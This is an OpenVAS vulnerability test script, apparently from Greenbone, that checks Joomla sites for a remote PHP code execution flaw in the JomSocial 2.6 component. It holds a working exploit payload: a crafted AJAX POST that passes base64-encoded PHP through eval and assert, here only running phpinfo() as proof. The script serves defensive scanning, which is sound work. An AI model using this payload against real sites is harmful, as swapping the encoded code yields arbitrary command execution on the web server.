###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_jomsocial_02_14.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Joomla JomSocial 2.6 Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103906");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla JomSocial 2.6 Code Execution");

  script_xref(name:"URL", value:"http://www.jomsocial.com/blog/hot-fix-3-1-0-4");

  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-02-11 17:03:11 +0100 (Tue, 11 Feb 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"impact", value:"Successful exploits will allow remote attackers to execute arbitrary commands
within the context of the webserver.");

  script_tag(name:"vuldetect", value:"Try to execute the phpinfo() command by using a special crafted HTTP POST
request");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"JomSocial is prone to a remote PHP code execution Vulnerability");

  script_tag(name:"affected", value:"Joomla JomSocial component version 2.6.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if (!port = get_app_port(cpe: CPE))
  exit( 0 );

if (!dir = get_app_location(cpe: CPE, port: port))
  exit( 0 );

if( dir == '/' ) dir = '';

url = dir + '/';
req = http_post( item:url, port:port, data:"option=com_community&view=frontpage" );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

token = eregmatch( string:buf, pattern:'<input type="hidden" name="([a-f0-9]{32})" value="1"' );
if( isnull( token[1] ) ) exit( 0 );

token = token[1];

cookie = eregmatch(pattern: 'Set-Cookie: ([^\r\n]+)',string:buf );
if( isnull( cookie[1] ) ) exit( 0 );

cookie = cookie[1];

useragent = http_get_user_agent();
host = http_host_name(port:port);

ex = 'option=community&no_html=1&task=azrul_ajax&func=photos,ajaxUploadAvatar&' +
     token + '=1&arg2=["_d_","Event"]&arg3=["_d_","374"]&arg4=["_d_","%7B%22'   +
     'call%22%3A%5B%22CStringHelper%22%2C%22escape%22%2C%20%22%40exit%28%40'    +
     'eval%28%40base64_decode%28%27cGhwaW5mbygpOw%3D%3D%27%29%29%29%3B%22%2C'   + # cGhwaW5mbygpOw== -> execute phpinfo();
     '%22assert%22%5D%7D"]';

len = strlen( ex );

req = 'POST ' + dir + '/ HTTP/1.1\r\n' +
      'Accept-Encoding: identity\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Connection: close\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Host: ' + host + '\r\n' +
      'Referer: http://' + host + '\r\n' +
      'Cookie: ' + cookie + '\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      '\r\n' +
      ex;

buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
if( "<title>phpinfo()" >< buf )
{
  security_message(port:port);
  exit( 0 );
}

exit( 99 );
